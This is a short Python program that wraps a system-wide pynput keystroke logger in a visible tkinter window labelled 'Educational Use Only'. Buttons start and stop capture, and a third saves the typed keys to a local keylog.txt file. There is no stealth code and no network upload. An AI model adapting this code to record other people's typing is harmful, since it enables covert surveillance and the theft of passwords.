import tkinter as tk
from pynput import keyboard
import threading

class KeyloggerGUI:
    def __init__(self, master):
        self.master = master
        master.title("Keylogger (Educational Use Only)")

        self.log = ""
        self.running = False
        self.listener = None

        self.text_area = tk.Text(master, height=10, width=50)
        self.text_area.pack()

        self.start_button = tk.Button(master, text="Start Logging", command=self.start_logging)
        self.start_button.pack()

        self.stop_button = tk.Button(master, text="Stop Logging", command=self.stop_logging)
        self.stop_button.pack()

        self.save_button = tk.Button(master, text="Save Log", command=self.save_log)
        self.save_button.pack()

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            self.log += f"[{key}]"
        self.text_area.insert(tk.END, key.char if hasattr(key, 'char') else f"[{key}]")
        self.text_area.see(tk.END)

    def start_logging(self):
        if not self.running:
            self.running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()

    def stop_logging(self):
        if self.running and self.listener:
            self.listener.stop()
            self.running = False

    def save_log(self):
        with open("keylog.txt", "w") as file:
            file.write(self.log)

# Run the GUI
root = tk.Tk()
gui = KeyloggerGUI(root)
root.mainloop()
